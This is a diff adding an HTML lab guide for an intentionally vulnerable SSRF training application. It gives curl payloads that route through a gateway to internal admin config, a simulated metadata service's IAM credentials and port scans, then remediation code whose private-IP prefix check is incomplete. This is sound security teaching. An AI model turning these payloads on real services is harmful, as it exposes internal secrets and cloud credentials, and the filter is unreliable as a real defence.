@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>Lab Guide - SSRF Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>pre{background:#1e1e1e;color:#d4d4d4;padding:12px;border-radius:4px;font-size:.85em;overflow-x:auto}</style>
+</head>
+<body>
+<nav class="navbar navbar-dark bg-dark py-1">
+    <div class="container-fluid">
+        <span class="navbar-brand fw-bold">Lab 03 — SSRF Lab Guide</span>
+        <a href="/" class="btn btn-outline-light btn-sm">← Lab UI</a>
+    </div>
+</nav>
+<div class="container py-4">
+    <div class="alert alert-danger">
+        <strong>Educational Lab:</strong> Contains intentional SSRF vulnerabilities. Use only in isolated training environments.
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Lab Overview</h5></div>
+        <div class="card-body">
+            <p><strong>Application:</strong> APIHub — Node.js API Gateway with microservices</p>
+            <p><strong>Target:</strong> <a href="http://localhost:3000">http://localhost:3000</a></p>
+            <p><strong>Architecture:</strong></p>
+            <ul>
+                <li>API Gateway (3000) — public facing, SSRF vulnerable</li>
+                <li>Auth Service (3001) — internal, has debug endpoint</li>
+                <li>User Service (3002) — internal user data</li>
+                <li>Admin Service (3003) — internal, contains sensitive config</li>
+                <li>Fake IMDS (8169) — simulates cloud metadata with fake credentials</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 1: Reconnaissance</h5></div>
+        <div class="card-body">
+            <pre>curl http://localhost:3000/api/services    # Discover internal service IPs/ports
+curl http://localhost:3000/api/health/all  # Check which services are reachable
+curl http://localhost:3000/api/fetch?url=http://localhost:3000/  # Self-SSRF</pre>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 2: Threat Modeling</h5></div>
+        <div class="card-body">
+            <table class="table table-sm">
+                <thead><tr><th>Threat</th><th>Asset</th><th>Attack</th><th>CVSS</th></tr></thead>
+                <tbody>
+                    <tr><td>Info Disclosure</td><td>Internal service data</td><td>SSRF to /admin/config</td><td>8.6 High</td></tr>
+                    <tr><td>Credential Theft</td><td>Cloud IAM credentials</td><td>SSRF to IMDS endpoint</td><td>9.8 Critical</td></tr>
+                    <tr><td>Network Recon</td><td>Internal network topology</td><td>Port scan via SSRF</td><td>5.3 Medium</td></tr>
+                    <tr><td>Auth Bypass</td><td>Admin service</td><td>Direct internal access</td><td>9.1 Critical</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 3: Exploitation</h5></div>
+        <div class="card-body">
+            <h6 class="text-danger">SSRF-001: Access Internal Admin Service</h6>
+            <pre>curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:3003/admin/config"
+# Returns: DB credentials, API keys, JWT secrets, internal service IPs</pre>
+
+            <h6 class="text-danger mt-3">SSRF-002: Cloud Metadata Credential Theft</h6>
+            <pre>curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/"
+curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/"
+curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/production-ec2-role"
+# Returns: AccessKeyId, SecretAccessKey, Token (FAKE training credentials)</pre>
+
+            <h6 class="text-danger mt-3">SSRF-003: Internal Port Scanning</h6>
+            <pre>curl "http://localhost:3000/api/scan/internal?range=127.0.0.1&ports=3000,3001,3002,3003,8169,22,80,443,8080,5432"
+# Maps open/closed/filtered ports on the internal network</pre>
+
+            <h6 class="text-danger mt-3">SSRF-004: Webhook SSRF</h6>
+            <pre>curl -X POST http://localhost:3000/api/webhook/notify \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.0.0.1:3003/admin/config"}'</pre>
+
+            <h6 class="text-danger mt-3">SSRF-005: Open Proxy</h6>
+            <pre>curl "http://localhost:3000/api/proxy/127.0.0.1:3001/auth/debug"
+curl "http://localhost:3000/api/proxy/127.0.0.1:3002/users"</pre>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 4: Impact Assessment</h5></div>
+        <div class="card-body">
+            <ul>
+                <li><strong>Database credentials exposed:</strong> Full database access → all data compromised</li>
+                <li><strong>Cloud IAM credential theft:</strong> Attacker gains AWS access → data exfiltration, resource abuse</li>
+                <li><strong>Internal service access:</strong> Bypass network segmentation entirely</li>
+                <li><strong>JWT secret exposure:</strong> Attacker can forge auth tokens for any user</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-success text-white"><h5 class="mb-0">Step 5: Remediation</h5></div>
+        <div class="card-body">
+            <h6>1. URL Allowlisting</h6>
+            <pre>const ALLOWED_DOMAINS = ['api.external.com', 'hooks.partner.com'];
+function isUrlAllowed(url) {
+    const parsed = new URL(url);
+    return ALLOWED_DOMAINS.includes(parsed.hostname);
+}</pre>
+
+            <h6>2. Block Private IP Ranges</h6>
+            <pre>const ipRangesPrivate = ['10.', '172.16.', '192.168.', '127.', '169.254.'];
+function isPrivateIP(url) {
+    const parsed = new URL(url);
+    return ipRangesPrivate.some(prefix => parsed.hostname.startsWith(prefix));
+}</pre>
+
+            <h6>3. Use IMDSv2 (AWS Metadata Protection)</h6>
+            <pre># IMDSv2 requires a PUT request to get a token first
+# Simple GET to 169.254.169.254 no longer works</pre>
+
+            <h6>4. Network Segmentation</h6>
+            <pre># Docker: Use separate networks
+# admin-service should only be on internal network
+# gateway should not have access to admin network</pre>
+        </div>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
